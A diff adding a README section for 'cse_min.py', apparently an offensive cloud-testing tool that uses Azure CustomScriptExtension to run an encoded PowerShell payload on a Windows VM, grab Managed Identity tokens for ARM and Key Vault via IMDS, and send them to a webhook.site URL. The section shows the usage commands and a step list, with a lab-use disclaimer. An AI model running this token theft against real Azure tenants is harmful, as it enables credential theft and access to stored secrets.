@@ -105,6 +105,30 @@ python3 psenc.py -f payload.ps1 > encoded.txt
 echo '$PSVersionTable.PSVersion' | python3 psenc.py --stdin
 ```
 
+### 🕸️ cse_min.py
+Trigger the Azure CustomScriptExtension on a Windows VM to run a PowerShell payload that collects Managed Identity tokens (ARM + Key Vault) and exfiltrates them to a specified webhook.
+
+#### Usage
+```bash
+# basic usage (System-Assigned MI)
+python3 cse_min.py -g <resource-group> -n <vm-name> -w https://webhook.site/<uuid>
+
+# with User-Assigned Managed Identity client ID
+python3 cse_min.py -g <resource-group> -n <vm-name> \
+    -w https://webhook.site/<uuid> \
+    --uami <user-assigned-mi-client-id>
+
+# dry run (show PowerShell and encoded command without sending)
+python3 cse_min.py -g <resource-group> -n <vm-name> -w <webhook-url> --show
+```
+
+This will:
+	1.	Build the PowerShell payload to grab ARM + Key Vault access tokens via IMDS.
+	2.	Encode it to UTF-16LE Base64 for -EncodedCommand execution.
+	3.	Deploy it to the target VM via Azure CLI az vm extension set with CustomScriptExtension.
+	4.	POST results to the given webhook.
+
+
 ⚠️ Disclaimer
 
 For educational and lab use only.
